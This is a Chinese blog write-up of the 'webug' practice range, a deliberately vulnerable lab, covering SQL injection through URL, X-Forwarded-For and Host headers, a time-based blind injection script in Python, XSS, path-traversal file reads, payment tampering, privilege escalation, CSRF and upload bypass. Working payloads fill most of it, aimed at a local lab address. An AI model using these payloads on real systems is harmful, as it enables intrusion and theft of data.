title: webug 靶场
author: Qianye
abbrlink: 523c96b0
tags:
  - ctf
categories:
  - ctf
date: 2018-03-12 13:56:00
---
这个靶场不错，可惜的是有些题目复现不出来，有些小问题。
<!-- more -->

# 渗透基础

## 普通的get注入
```bash
http://192.168.3.129/pentest/test/sqli/sqltamp.php?gid=1' order by 4 %23
```
```bash
http://192.168.3.129/pentest/test/sqli/sqltamp.php?gid=1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4%23
```
```bash
http://192.168.3.129/pentest/test/sqli/sqltamp.php?gid=1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x666C6167),4%23
```
```bash
http://192.168.3.129/pentest/test/sqli/sqltamp.php?gid=1' union select 1,2,(select group_concat(flag) from flag),4%23
```
## 从图片中找到有用的信息
只能看到123.txt, 此题有点问题
## 你看到了什么
给了一个假的flag。</br>
用御剑扫一下网站</br>
找到test目录，提示说尝试将目录MD5加密一下，将其加密，再访问
```bash
md5(test,32) = 098f6bcd4621d373cade4e832627b4f6
md5(test,16) = 4621d373cade4e83
```
第二个md5加密访问，得到flag
## 告诉你了FLANG是五位数
弱口令admin admin123尝试登入成功
## 一个优点小小的特殊的注入
X-Forwarded-For的一个注入，用bp抓包，将X-Forwarded-For:后面的额数据删除掉，显示出正确的答案。
```bash
X-Forwarded-For:order by 4 %23
```
```bash
X-Forwarded-For:union select 1,2,3,4 %23
```
```bash
X-Forwarded-For:union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4 %23
```
```bash
X-Forwarded-For:union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x666C6167),4 %23
```
```bash
X-Forwarded-For:union select 1,2,(select group_concat(flag) from flag),4 %23
```
## 这关需要RMB购买
一开始有一个登入框，直接查看源码，发现可以直接访问后台连接，出现买书页面。
支付逻辑问题，抓包后将价格改为负数，会提示不能白白拿书，将价格都改为0，购买成功.
```bash
bill1=0&bill2=0&num1=10&num2=10&uid=1
```
## 越权
用给的账户登入，修改密码的之后，bp抓包，将用户名改成admin，修改admin密码成功
```bash
username=admin&password1=123&password2=123&password3=123
```
## CSRF
用上一关的账号名登录，修改密码，bp抓包生成csrf界面，将此保存为html 管理员打开后就会更改其密码了 完成了CSRF
## url跳转
熟悉的界面，查看源码
```bash
<!--<a href="index.php?url=#">I</a>-->
```
构造
```bash
index.php?url=www.baidu.com
```
成功跳转
## 文件下载
后台出了点小问题,此题是任意文件下载
## 我和上题有点像
此题也是任意文件下载，不过这题是post方式下载。
post请求
```bash
pic=../../../pentest/test/7/1/db/config.php&submit=%E4%B8%8B%E8%BD%BD
```
## 我系统密码忘记了
上传一句话，这里我上传了一句话，但是连接的时候却出现连接不上，有点怪。
连接上了，就可以利用mimikatz读取管理员的账户密码了
## xss
点击页面上的666,连接上的666，显示在页面上，反射性xss,直接在id=后面加上xss语句即可。
```bash
http://192.168.3.129/pentest/test/9/?id=%3Cscript%3Ealert(%27qianye%27)%3C/script%3E
```
```bash
192.168.3.129/pentest/test/9/?id=<img src onerror=alert('qianye')>
```
## 存储型xss
在输入框中输入上面的xss语句即可。
## 什么？上传不了图片
先正常上传一张jpg图片,然后抓包,将jpg后缀修改为php,过关。
## 明天双十一
看别人的writeup说有源码，但表示查看源码时什么都没有，有点问题。看一下别人的源码，只要修改url,x-forwarded-for,referer就可以啦
```bash
GET /pentest/test/12/?url=www.taobao.com HTTP/1.1
Host: 192.168.3.129
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.3.129/pentest/test/12/
Cookie: PHPSESSID=eh6c536efhrbjh9tbfupi72sd0
X-Forwarded-For: 10.10.10.10
Connection: close
Upgrade-Insecure-Requests: 1
Referer:  www.baidu.com
```
# 中级进阶
## 出来一点东西
这道题本身有点问题，不过知道是任意文件读取就行啦。读取boot.int,试一下，可以成功
```bash
http://192.168.3.129/pentest/test/13/?country=../../../../../../boot.ini
```
## 提交方式是什么样的
任意文件读取，变成post方式
## 我还是一个注入
查看后台源码，才知道是host注入。
```bash
Host:  order by  4
```
```bash
Host:  union select 1,2,3,4
```
```bash
Host:  union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()
```
```bash
Host:  union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666C6167
```
```bash
Host:  union select 1,2,3,flag from flag
```
## 看看pak
逆向题不懂
## 时间盲注
运行有点卡，附上脚本自己试一下吧

```bash
#coding:'utf-8'
import requests
import time
import string
payloads=string.printable
length=0
result=''
print('start')
# 判断长度
for i in range(1,33):
    startTime=time.time()
    url="http://192.168.3.129/pentest/test/time/?type=2 and if(length(database())=%d,sleep(5),1)"%(i)
    #url="http://192.168.3.129/pentest/test/time/?type=2 and if(length(select group_concat(table_name) from information_schema.tables where table_schema=database())=%d,sleep(5),1)"%(i)
    #url="http://192.168.3.129/pentest/test/time/?type=2 and if(length(select group_concat(column_name) from information_schema.columns where table_schema= )=%d,sleep(5),1)"%(i)
    #url="http://192.168.3.129/pentest/test/time/?type=2 and if(length(select group_concat() from )=%d,sleep(5),1)"%(i)
    response=requests.get(url)
    if time.time()-startTime >=5:
        length=i
        print("the database length is"+str(i))

# 猜测
print("start brute sql")
for j in range(1,length+1):
    for k in payloads:
        startTime1=time.time()
        url1="http://192.168.3.129/pentest/test/time/?type=2 and if(substr(database(),'%d',1)='%s',sleep(5),1)"%(j,k)
        #url1="http://192.168.3.129/pentest/test/time/?type=2 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 1),'%d',1)='%s',sleep(5),1)"%(j,k)
        #url1="http://192.168.3.129/pentest/test/time/?type=2 and if(substr(select group_concat(column_name) from information_schema.columns where table_name= ,'%d',1)='%s',sleep(5),1)"%(j,k)
        #url1="http://192.168.3.129/pentest/test/time/?type=2 and if(substr(select group_concat() from ,'%d',1)='%s',sleep(5),1)"%(j,k)
        response1=requests.get(url1)
        if time.time()-startTime1 >=5:
            result+=k
            print(result)
            break

print("result is:"+result)


```
## DZ论坛
复现失败
## aspcms
复现失败
## phpmyadmin